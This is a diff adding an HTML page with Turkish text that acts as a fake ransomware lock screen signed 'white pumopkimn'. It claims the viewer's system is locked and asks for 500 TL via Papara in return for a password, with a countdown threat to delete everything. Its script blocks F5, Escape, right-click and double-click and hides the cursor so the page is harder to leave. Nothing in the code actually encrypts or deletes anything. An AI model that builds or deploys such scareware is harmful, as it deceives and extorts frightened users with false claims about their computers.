@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<title>HACKED</title>
+<style>
+  body {
+    margin: 0;
+    padding: 0;
+    height: 100vh;
+    background: #000;
+    color: #0f0;
+    font-family: 'Courier New', monospace;
+    overflow: hidden;
+    cursor: none;
+  }
+  .container {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    text-align: center;
+  }
+  h1 {
+    font-size: 90px;
+    margin: 0;
+    text-shadow: 0 0 20px #0f0;
+    animation: blink 1s infinite;
+  }
+  .pumopkimn {
+    font-size: 140px;
+    color: #ff0044;
+    text-shadow: 0 0 30px #ff0044;
+    margin: 20px 0;
+    animation: pulse 2s infinite;
+  }
+  p {
+    font-size: 35px;
+    margin: 15px 0;
+  }
+  .locked {
+    font-size: 60px;
+    color: #ff0000;
+    animation: shake 0.5s infinite;
+  }
+  .skull {
+    font-size: 200px;
+    margin: 30px 0;
+    animation: rotate 10s infinite linear;
+  }
+  @keyframes blink {
+    0%,100% { opacity: 1; }
+    50% { opacity: 0.3; }
+  }
+  @keyframes pulse {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.1); }
+    100% { transform: scale(1); }
+  }
+  @keyframes shake {
+    0% { transform: translate(0,0); }
+    25% { transform: translate(-10px,0); }
+    50% { transform: translate(10px,0); }
+    75% { transform: translate(-10px,0); }
+    100% { transform: translate(0,0); }
+  }
+  @keyframes rotate {
+    from { transform: rotate(0deg); }
+    to { transform: rotate(360deg); }
+  }
+</style>
+</head>
+<body ondblclick="return false;" oncontextmenu="return false;">
+  <div class="container">
+    <div class="skull">💀</div>
+    <h1>YOU ARE HACKED</h1>
+    <div class="pumopkimn">white pumopkimn</div>
+    <p class="locked">YOUR SYSTEM IS LOCKED BY ME</p>
+    <p>Şifre için 500 TL gönder → Papara: 0555 123 45 67</p>
+    <p>Parayı göndermezsen her şeyi silerim… 5… 4… 3…</p>
+  </div>
+
+  <script>
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'F5' || e.key === 'Escape') {
+        e.preventDefault();
+      }
+    });
+    setInterval(() => {
+      document.title = document.title === "HACKED" ? "white pumopkimn WAS HERE" : "HACKED";
+    }, 500);
+  </script>
+</body>
+</html>
